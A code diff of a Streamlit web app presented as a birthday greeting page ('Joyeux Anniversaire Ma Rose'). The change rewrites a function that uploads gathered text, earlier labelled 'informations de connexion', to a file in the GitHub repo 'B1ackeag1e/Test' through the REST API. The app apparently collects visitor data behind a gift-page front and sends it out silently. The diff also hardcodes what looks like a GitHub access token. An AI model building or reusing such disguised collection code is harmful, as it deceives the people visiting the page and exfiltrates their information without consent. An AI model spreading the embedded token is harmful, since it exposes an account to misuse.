@@ -1,7 +1,7 @@
 import streamlit as st
 import requests
 import datetime
-from github import Github
+import base64
 
 # --- Configuration de la page ---
 st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")
@@ -31,37 +31,46 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# --- Fonction pour envoyer/mettre à jour le fichier informations.txt sur GitHub ---
+# --- Fonction ultra-fiable pour envoyer sur GitHub via l'API REST ---
 def envoyer_sur_github(contenu_texte):
-    # Collez votre nouveau token ici entre les guillemets
+    # Collez votre token ici entre les guillemets
     GITHUB_TOKEN = "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"
-    NOM_REPO = "B1ackeag1e/Test"
+    NOM_REPO = "B1ackeag1e/Test"  # Bien vérifier le '1'
     NOM_FICHIER = "informations.txt"
     
-    try:
-        # Connexion directe simplifiée
-        g = Github(GITHUB_TOKEN)
-        repo = g.get_repo(NOM_REPO)
+    url = f"https://api.github.com/repos/{NOM_REPO}/contents/{NOM_FICHIER}"
+    
+    headers = {
+        "Authorization": f"token {GITHUB_TOKEN}",
+        "Accept": "application/vnd.github.v3+json"
+    }
+    
+    # 1. Vérifier si le fichier existe déjà pour récupérer son SHA (nécessaire pour modifier un fichier existant)
+    sha = None
+    r_check = requests.get(url, headers=headers)
+    if r_check.status_code == 200:
+        sha = r_check.json().get("sha")
         
-        message_commit = f"Mise à jour des informations de connexion - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    # 2. Encoder le contenu en Base64 (obligatoire pour l'API GitHub)
+    contenu_b64 = base64.b64encode(contenu_texte.encode("utf-8")).decode("utf-8")
+    
+    message_commit = f"Mise à jour des informations - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    
+    payload = {
+        "message": message_commit,
+        "content": contenu_b64
+    }
+    
+    if sha:
+        payload["sha"] = sha  # Ajout du SHA si le fichier existe déjà
         
-        try:
-            file_contents = repo.get_contents(NOM_FICHIER)
-            repo.update_file(
-                path=NOM_FICHIER,
-                message=message_commit,
-                content=contenu_texte,
-                sha=file_contents.sha
-            )
-        except:
-            repo.create_file(
-                path=NOM_FICHIER,
-                message=message_commit,
-                content=contenu_texte
-            )
+    # 3. Envoyer la requête PUT à GitHub
+    r_put = requests.put(url, headers=headers, json=payload)
+    
+    if r_put.status_code in [200, 201]:
         return True, "Succès"
-    except Exception as e:
-        return False, str(e)
+    else:
+        return False, f"Code {r_put.status_code}: {r_put.text}"
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -130,7 +139,7 @@ elif st.session_state.etape == 3:
         except Exception as e:
             contenu_txt += f"Erreur lors de la récupération : {e}\n"
         
-        # Enregistrement sur GitHub et test du retour
+        # Enregistrement sur GitHub
         succes, message_erreur = envoyer_sur_github(contenu_txt)
         
         if succes:
